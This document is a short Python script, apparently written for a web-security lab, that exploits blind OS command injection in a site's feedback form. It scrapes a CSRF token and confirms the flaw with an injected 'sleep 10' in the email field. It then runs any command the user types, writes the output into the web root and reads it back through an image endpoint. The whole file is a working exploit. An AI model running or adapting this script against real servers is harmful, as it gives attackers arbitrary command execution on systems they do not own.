import requests
import urllib3
from bs4 import BeautifulSoup
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def getCSRF(s,url):
    path='feedback'
    r=s.get(url+path,verify=False,proxies=proxies)
    soup=BeautifulSoup(r.text,'html.parser')
    csrf=soup.find("input")['value']
    return csrf

def inject(url,command,s):
    csrfToken=getCSRF(s,url)
    path="feedback/submit"
    command_1="test@gmail.com & sleep 10 #"
    command_2=f"test@gmail.com & {command} > /var/www/images/output.txt #"
    params={'csrf':f'{csrfToken}','name':'test','email':f'{command_1}','subject':'test','message':'test'}

    checkResponse=s.post(url+path,data=params,verify=False,proxies=proxies)

    if(checkResponse.elapsed.total_seconds()>=10):
        print("The Parameter is Vulnerable to Blind Time Based Command Injection")
        params={'csrf':f'{csrfToken}','name':'test','email':f'{command_2}','subject':'test','message':'test'}
        r=s.post(url+path,data=params,verify=False,proxies=proxies)
        
        path="image?filename=output.txt"
        outputResponse=requests.get(url+path,verify=False,proxies=proxies)

        print(f"The Output of the Command is : \n{outputResponse.text}")

    else:
        print("Not Vulnerable ! ")

def main():
    url=input("Enter the URL Here : ")
    command=input("Enter the command Here : ")

    s=requests.session()
    inject(url,command,s)


if __name__=="__main__":
    main()